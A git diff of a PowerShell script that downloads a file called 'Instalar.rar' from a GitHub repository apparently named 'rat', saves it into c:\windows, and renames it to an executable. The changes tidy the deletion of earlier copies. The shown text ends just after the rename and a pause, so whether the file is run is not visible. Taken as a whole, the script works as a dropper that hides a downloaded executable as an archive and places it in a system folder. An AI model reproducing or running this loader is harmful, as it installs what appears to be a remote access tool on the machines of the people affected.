@@ -2,13 +2,16 @@
 cd\
 cd c:\windows
 
+$fs = 'c:\windows\Instalar.exe'
+try {	
+   Remove-Item $fs -recurse
+} Catch {}
+
 $fs = 'c:\windows\Instalar.rar'
-if (Test-Path $fs) {
-  try {	
-     Remove-Item $fs -recurse
-  } Catch {
-  }
-}
+try {	
+   Remove-Item $fs -recurse
+} Catch {}
+
 
 $url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
 $output = "c:\windows\Instalar.rar"
@@ -17,6 +20,7 @@ $start_time = Get-Date
 Invoke-WebRequest -Uri $url -OutFile $output
 Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"
 
+$fs = 'c:\windows\Instalar.rar'
 if (Test-Path $fs) {
    rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
    Start-Sleep -s 1
